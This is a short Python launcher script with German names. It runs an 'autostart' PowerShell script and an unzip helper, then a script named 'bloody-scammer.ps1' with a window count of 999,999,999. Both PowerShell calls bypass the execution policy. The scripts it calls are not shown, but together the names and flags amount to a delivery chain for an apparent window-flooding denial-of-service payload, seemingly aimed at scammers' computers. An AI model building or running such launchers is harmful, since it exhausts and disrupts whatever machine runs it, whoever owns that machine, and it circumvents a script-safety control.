from pathlib import Path
import subprocess
import sys


ORDNER = Path(__file__).parent
AUTOSTART = ORDNER / "autostart.ps1"
ENTPACKER = ORDNER / "entpacke_zip.py"
BLOODY_SCAMMER = ORDNER / "bloody-scammer.ps1"


def starte() -> None:
    if AUTOSTART.is_file():
        subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-File",
                str(AUTOSTART),
            ],
            check=True,
        )

    if ENTPACKER.is_file():
        subprocess.run([sys.executable, str(ENTPACKER)], check=True)

    if BLOODY_SCAMMER.is_file():
        subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-File",
                str(BLOODY_SCAMMER),
                "-WindowCount",
                "999999999",
            ],
            check=True,
        )


if __name__ == "__main__":
    starte()
